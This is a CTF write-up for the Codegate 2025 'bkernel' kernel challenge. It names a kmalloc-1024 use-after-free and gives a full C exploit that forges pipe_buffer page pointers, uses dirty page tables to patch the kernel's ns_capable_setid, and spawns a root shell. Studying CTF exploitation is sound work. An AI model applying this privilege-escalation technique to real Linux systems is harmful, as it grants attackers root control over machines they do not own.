# bkernel
<primary-label ref="pwn"/>

codegate ctf 2025 final junior division

## vulnerability
obvious kmalloc-1024 use after free

## exploit
overlap pipe_buffer -> falsify page pointer -> page-level uaf -> dirty-page_table
```c
#define _GNU_SOURCE

#include <stdlib.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include "e.h"

#define DEVICE_NAME "/dev/bkernel"

int main(void) {
    init_proc();
    info("open")

    void *pte_setup = SYSCHK(mmap(PTI_TO_VIRT(0x1, 0x0, 0x0, 0x0, 0x0), 4098,
                         PROT_READ | PROT_WRITE, MAP_PRIVATE | 0x20 | MAP_FIXED, -1, 0));
    *(char *)pte_setup = 0x1;

    int fd = SYSCHK(open(DEVICE_NAME, O_RDWR));
    int uaf = SYSCHK(open(DEVICE_NAME, O_RDWR));

    int **pp = pipe_alloc_2(0x20,0,0x10);
    info("spray pipe 1");
    rep(i,0x10) {
        pipe_write(pp[i], strrep(0x41+i,8),8);
    }

    SYSCHK(close(fd));

    pipe_alloc_3(pp, 0x10, 0x20);
    info("spray pipe 2");
    rep(i,0x10) {
        pipe_write(pp[i+0x10], strrep(0x41+0x10+i,8),8);
    }

    char payload[0x400] = {0};
    memset(payload,0,sizeof(payload));
    SYSCHK(read(uaf, payload, sizeof(payload)));
    dump_memory(payload, 0x40);

    struct pipe_buffer *pipe_leak = (struct pipe_buffer *)payload;
    unsigned long pipe_page = (unsigned long)pipe_leak->page;
    HEXDEBUG(pipe_page);
    pipe_leak->page = (struct page *)(pipe_page+0x40);
    SYSCHK(write(uaf, payload, sizeof(payload)));

    int atk, vic;
    rep(i, 0x20) {
        char *content = pipe_read(pp[i],0x8);
        if (strncmp(content,strrep(0x41+i,8),8) != 0) {
            vic = (int)content[0] - 0x41;
            atk = i;
            HEXDEBUG(atk);
            HEXDEBUG(vic);
            break;
        }
    }

    pipe_close(pp[atk]);
    void *new_pte = SYSCHK(mmap(PTI_TO_VIRT(0x1, 0x0, 0x80, 0x0, 0x0), 4098,
                         PROT_READ | PROT_WRITE, MAP_PRIVATE | 0x20 | MAP_FIXED, -1, 0));
    *(char *)new_pte = 0x1;

    dump_memory(pipe_read(pp[vic],0x20),0x20);

    unsigned long ns_capable_setid = 0xffffffff81096790;
    unsigned long diff = ns_capable_setid - 0xffffffff81000000;
    unsigned long machine[3] = {0x83f28953fa1e0ff3,0x1c8b4865427728fe,0x838b4c0002ad4025};

    rep (i,256) {
        char ptes[8];
        unsigned long *p = (unsigned long *)ptes;
        unsigned long pys_modprobe = KASLR_DIFF(KVIRT_TO_PHYS(diff),i);
        unsigned long pte_modprobe = PHYS_ENTRY(pys_modprobe);
        *p = pte_modprobe;

        SYSCHK(write(pp[vic][1], ptes, sizeof(ptes)));
        char *check = PTI_TO_VIRT(0x1, 0x0, 0x80, i, diff & 0xfff);

        printf("check %d @ %p |", (int)i, check);
        xxd(check, 0x10);

        if (memcmp(check, machine, 24) ==0){
            success("found ns_capable_setid");
            memmove(check, &ret_true, 8);
            break;
        }
        fflush(stdout);
    }

    success("win");
    SYSCHK(setuid(0));
    info("uid: %d", getuid());

    shell();

    return 0;
}
```
